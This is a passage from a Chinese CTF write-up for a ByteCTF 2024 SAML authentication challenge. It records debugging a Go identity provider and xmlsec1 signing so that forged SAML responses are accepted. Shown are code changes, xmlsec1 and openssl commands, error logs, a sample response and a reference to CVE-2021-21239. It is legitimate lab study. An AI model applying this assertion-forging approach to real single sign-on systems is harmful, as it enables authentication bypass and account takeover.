&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					DigestValue: DigestValue&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:DigestValue&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			SignatureValue: SignatureValue&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:SignatureValue&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			KeyInfo: KeyInfo&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:KeyInfo&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				X509Data: X509Data&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:X509Data&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					X509Certificate: X509Certificate&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:X509Certificate&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Cert: &quot;&quot;, // caller must populate cert,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		Status: Status&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlp:Status&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			StatusCode: StatusCode&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlp:StatusCode&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				// TODO unsuccesful responses??</span><br><span class="line">				Value: &quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		Assertion: Assertion&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;saml:Assertion&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			XS:           &quot;http://www.w3.org/2001/XMLSchema&quot;,</span><br><span class="line">			XSI:          &quot;http://www.w3.org/2001/XMLSchema-instance&quot;,</span><br><span class="line">			SAML:         &quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;,</span><br><span class="line">			Version:      &quot;2.0&quot;,</span><br><span class="line">			ID:           util.ID(),</span><br><span class="line">			IssueInstant: time.Now().UTC().Format(time.RFC3339Nano),</span><br><span class="line">			Issuer: Issuer&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Issuer&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				Url: &quot;&quot;, // caller must populate ar.AppSettings.AssertionConsumerServiceURL,</span><br><span class="line">			&#125;,</span><br><span class="line">			Subject: Subject&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Subject&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				NameID: NameID&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;saml:NameID&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Format:          &quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;,</span><br><span class="line">					Value:           &quot;&quot;,</span><br><span class="line">					SPNameQualifier: &quot;&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SubjectConfirmation: SubjectConfirmation&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;saml:SubjectConfirmation&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Method: &quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;,</span><br><span class="line">					SubjectConfirmationData: SubjectConfirmationData&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;saml:SubjectConfirmationData&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						InResponseTo: &quot;&quot;,</span><br><span class="line">						NotOnOrAfter: time.Now().Add(time.Minute * 5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">						Recipient:    &quot;&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Conditions: Conditions&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Conditions&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				NotBefore:            time.Now().Add(time.Minute * -5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">				NotOnOrAfter:         time.Now().Add(time.Minute * 5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">				AudienceRestrictions: []AudienceRestriction&#123;&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			AttributeStatement: AttributeStatement&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:AttributeStatement&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				Attributes: []Attribute&#123;&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20241111200952916.png" alt="image-20241111200952916"></p>
<p>照着添加（一个个试了试）</p>
<pre><code>    authnResponse.Issuer.SAML = &quot;error&quot;
    authnResponse.Assertion.Issuer.SAML = &quot;error&quot;
</code></pre>
<p>成功解决 ，但是报错2</p>
<h3 id="报错2"><a href="#报错2" class="headerlink" title="报错2"></a>报错2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : func=xmlSecBase64CtxFinal_ex:file=base64.c:line=299:obj=unknown:subj=xmlSecBase64CtxDecodeIsFinished:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecBase64Decode_ex:file=base64.c:line=709:obj=unknown:subj=xmlSecBase64CtxFinal_ex:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyValueX509XmlReadBase64Blob:file=keysdata.c:line=2118:obj=unknown:subj=xmlSecBase64DecodeInPlace:error=1:xmlsec library function failed:node=X509Certificate</span><br><span class="line">func=xmlSecKeyValueX509XmlRead:file=keysdata.c:line=2283:obj=unknown:subj=xmlSecKeyValueX509XmlReadBase64Blob(cert):error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyDataX509XmlRead:file=keysdata.c:line=1908:obj=x509:subj=xmlSecKeyValueX509XmlRead:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecOpenSSLKeyDataX509XmlRead:file=x509.c:line=567:obj=x509:subj=xmlSecKeyDataX509XmlRead:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyInfoNodeRead:file=keyinfo.c:line=123:obj=x509:subj=xmlSecKeyDataXmlRead:error=1:xmlsec library function failed:node=X5</span><br></pre></td></tr></table></figure>

<p>用sp的证书试试，也有问题。</p>
<h3 id="跟进签名逻辑看看"><a href="#跟进签名逻辑看看" class="headerlink" title="跟进签名逻辑看看"></a>跟进签名逻辑看看</h3><p><img src="/../imgs/$%7Bfiilename%7D/image-20241111201231381.png" alt="image-20241111201231381"></p>
<p>先生成临时文件，添加xml声明作为首行，调用xmlsec1。这个err是xmlsec1给出的。</p>
<p>只能再换证书。生成新的密钥对：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout idp_private_key.pem -out idp_public_key.pem -days 365 -nodes -subj &quot;/C=XX/ST=XX/L=XX/O=XX/CN=XX&quot;</span><br></pre></td></tr></table></figure>

<p>还是异常。</p>
<p>换CVE-2021-21239 Report - Google Docs中的私钥  还是不行。</p>
<p>怀疑是因为没有权限，给证书换个位置，还不行。</p>
<p>迷惑了。</p>
<p>用exec.command执行的语句，给test.xml签名</p>
<p>xmlsec1 –sign –privkey-pem &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;bytectf2024_ezauth&#x2F;key.pem –id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response –output &#x2F;signed.xml test.xml  </p>
<p>签名成功。说明是idp代码的问题。</p>
<h3 id="改idp"><a href="#改idp" class="headerlink" title="改idp"></a>改idp</h3><p>观察到            </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;samlsig:X509Certificate&gt;stringValueOfCert&lt;/samlsig:X509Certifica</span><br></pre></td></tr></table></figure>

<p>这个项目utils给了加载证书的方法，加载一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b, err := ioutil.ReadFile(&quot;/home/kali/Desktop/bytectf2024_ezauth/cert.pem&quot;)</span><br><span class="line">cert := string(b)</span><br><span class="line"></span><br><span class="line">re := regexp.MustCompile(&quot;---(.*)CERTIFICATE(.*)---&quot;)</span><br><span class="line">cert = re.ReplaceAllString(cert, &quot;&quot;)</span><br><span class="line">cert = strings.Trim(cert, &quot; \n&quot;)</span><br><span class="line">cert = strings.Replace(cert, &quot;\n&quot;, &quot;&quot;, -1)</span><br></pre></td></tr></table></figure>

<p>不报证书错了。</p>
<h3 id="报错3"><a href="#报错3" class="headerlink" title="报错3"></a>报错3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : C14N error : Relative namespace UR is invalid here : (null)</span><br><span class="line">C14N error : Internal error : checking for relative namespaces</span><br><span class="line">C14N error : Internal error : processing childrens list</span><br><span class="line">C14N error : Internal error : processing docs children list</span><br><span class="line">func=xmlSecTransformC14NExecute:file=c14n.c:line=397:obj=c14n:subj=xmlC14NExecute:error=5:libxml2 library function failed:xml error: 1: Internal error : processing docs children list</span><br><span class="line"></span><br><span class="line">func=xmlSecTransformC14NPushXml:file=c14n.c:line=235:obj=c14n:subj=xmlSecTransformC14NExecute:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformDefaultPushXml:file=transforms.c:line=2118:obj=enveloped-signature:subj=xmlSecTransformPushXml:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformCtxXmlExecute:file=transforms.c:line=1052:obj=enveloped-signature:subj=xmlSecTransformPushXml:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformCtxExecute:file=transforms.c:line=1100:obj=unknown:subj=xmlSecTransformCtxXmlExecute:error=1:xmlsec library function fa</span><br></pre></td></tr></table></figure>

<p>不符合规范。。让chatgpt看了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">authnResponse.Issuer.SAML = &quot;&quot;</span><br><span class="line">authnResponse.Assertion.Issuer.SAML = &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>改成空就好了。</p>
<p>报错4</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731379479277.png" alt="1731379479277"></p>
<p>SAML块有问题，跟进去看看哪些地方需要修改</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112104531547.png" alt="image-20241112104531547"></p>
<p>对着解密base64，跟进，发现解密报错。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112104804430.png" alt="image-20241112104804430"></p>
<p>base字符 “+” 被替换成了 “ “，非常的典型。</p>
<p>加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodedString := url.QueryEscape(b64XML)</span><br><span class="line">encodedString = strings.Replace(encodedString, &quot;+&quot;, &quot;%2B&quot;, -1)</span><br></pre></td></tr></table></figure>

<p>成功进入Validate</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731380404419.png" alt="1731380404419"></p>
<p>对解密后的XML树的node值校验。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110123984.png" alt="image-20241112110123984"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110338510.png" alt="image-20241112110338510"></p>
<p>这两布没过，idp代码加上就好了。</p>
<h3 id="报错4"><a href="#报错4" class="headerlink" title="报错4"></a>报错4</h3><p>验证签名失败</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110554905.png" alt="image-20241112110554905"></p>
<p>跟进，观察到xmlsec1 verify时候才出的异常</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731380800515.png" alt="1731380800515"></p>
<p>签名和验证阶段的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">签名</span><br><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output /tmp/tmpgs1729266062 /tmp/tmpgs2471871990</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response /tmp/tmpgs357336979</span><br></pre></td></tr></table></figure>

<p>拷出一份没签名前的消息块idp2sp5.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;samlp:Response xmlns:samlp=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; xmlns:samlsig=&quot;http://www.w3.org/2000/09/xmldsig#&quot; Destination=&quot;http://localhost:8000/saml_consume&quot; ID=&quot;_ed59d777-c777-46ef-55e3-ab3cebf7d477&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2024-11-12T03:10:59.041732925Z&quot; InResponseTo=&quot;authnRequestIdRespondingTo&quot;&gt;</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">    &lt;samlsig:Signature Id=&quot;_944fac9f-fb10-4e72-61b6-3c8c1928777b&quot;&gt;</span><br><span class="line">        &lt;samlsig:SignedInfo&gt;</span><br><span class="line">            &lt;samlsig:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;&gt;&lt;/samlsig:CanonicalizationMethod&gt;</span><br><span class="line">            &lt;samlsig:SignatureMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;&gt;&lt;/samlsig:SignatureMethod&gt;</span><br><span class="line">            &lt;samlsig:Reference URI=&quot;&quot;&gt;</span><br><span class="line">                &lt;samlsig:Transforms&gt;</span><br><span class="line">                    &lt;samlsig:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;&gt;&lt;/samlsig:Transform&gt;</span><br><span class="line">                &lt;/samlsig:Transforms&gt;</span><br><span class="line">                &lt;samlsig:DigestMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;&gt;&lt;/samlsig:DigestMethod&gt;</span><br><span class="line">                &lt;samlsig:DigestValue&gt;&lt;/samlsig:DigestValue&gt;</span><br><span class="line">            &lt;/samlsig:Reference&gt;</span><br><span class="line">        &lt;/samlsig:SignedInfo&gt;</span><br><span class="line">        &lt;samlsig:SignatureValue&gt;&lt;/samlsig:SignatureValue&gt;</span><br><span class="line">        &lt;samlsig:KeyInfo&gt;</span><br><span class="line">            &lt;samlsig:X509Data&gt;</span><br><span class="line">                &lt;samlsig:X509Certificate&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:X509Certificate&gt;</span><br><span class="line">            &lt;/samlsig:X509Data&gt;</span><br><span class="line">        &lt;/samlsig:KeyInfo&gt;</span><br><span class="line">    &lt;/samlsig:Signature&gt;</span><br><span class="line">    &lt;samlp:Status&gt;</span><br><span class="line">        &lt;samlp:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;&gt;&lt;/samlp:StatusCode&gt;</span><br><span class="line">    &lt;/samlp:Status&gt;</span><br><span class="line">    &lt;saml:Assertion ID=&quot;_132ebb3f-a299-42c8-5960-f21bed10cce7&quot; Version=&quot;2.0&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; IssueInstant=&quot;2024-11-12T03:10:59.041740369Z&quot;&gt;</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">        &lt;saml:Subject&gt;</span><br><span class="line">            &lt;saml:NameID Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;&gt;userIdThatYouAuthenticated&lt;/saml:NameID&gt;</span><br><span class="line">            &lt;saml:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;</span><br><span class="line">                &lt;saml:SubjectConfirmationData InResponseTo=&quot;authnRequestIdRespondingTo&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.04174105Z&quot; Recipient=&quot;http://localhost:8000/saml_consume&quot;&gt;&lt;/saml:SubjectConfirmationData&gt;</span><br><span class="line">            &lt;/saml:SubjectConfirmation&gt;</span><br><span class="line">        &lt;/saml:Subject&gt;</span><br><span class="line">        &lt;saml:Conditions NotBefore=&quot;2024-11-12T03:05:59.041741731Z&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.041742162Z&quot;&gt;&lt;/saml:Conditions&gt;</span><br><span class="line">        &lt;saml:AttributeStatement&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;uid&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;userIdThatYouAuthenticated&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;email&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;someone@domain&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">        &lt;/saml:AttributeStatement&gt;</span><br><span class="line">    &lt;/saml:Assertion&gt;</span><br><span class="line">&lt;/samlp:Response&gt;                                                                                                                                                                                                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>新开一个终端命令行 用xmlsec1做做测试 让签名后的结果为 signed-idp2sp5.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br></pre></td></tr></table></figure>

<h3 id="报错5"><a href="#报错5" class="headerlink" title="报错5"></a>报错5</h3><p>之前没有报错的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">authnResponse.Issuer.SAML = &quot;&quot;</span><br><span class="line">authnResponse.Assertion.Issuer.SAML = &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时又报错了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">idp2sp5.xml:3: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                              ^</span><br><span class="line">idp2sp5.xml:27: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                                  ^</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                           </span><br></pre></td></tr></table></figure>

<p>但他并不影响signed-idp2sp5.xml的生成</p>
<p>查了一下SAML Response结构里xmlns:saml&#x3D;””是什么。</p>
<p><a target="_blank" rel="noopener" href="https://www.samltool.com/generic_sso_res.php">SAML Response Examples - SAML Assertion Example | SAMLTool.com</a></p>
<p>发现没有也还可以，删掉。</p>
<h3 id="报错6"><a href="#报错6" class="headerlink" title="报错6"></a>报错6</h3><p>删掉后去签名验证，验证失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLEvpSignatureVerify:file=evp_signatures.c:line=453:obj=rsa-sha1:subj=unknown:error=18:data do not match:details=EVP_VerifyFinal: signature verification failed</span><br><span class="line">FAIL</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">Error: failed to verify file &quot;signed-idp2sp5.xml&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里不确定说的是哪个证书(公钥)有问题，我们先用一组对称的密钥来签名验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br></pre></td></tr></table></figure>

<p>显示用对称密钥加解密就能成功。显然是xml中的证书的格式不对，没起到作用（因为我们在xml中放的就是cert.pem）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification 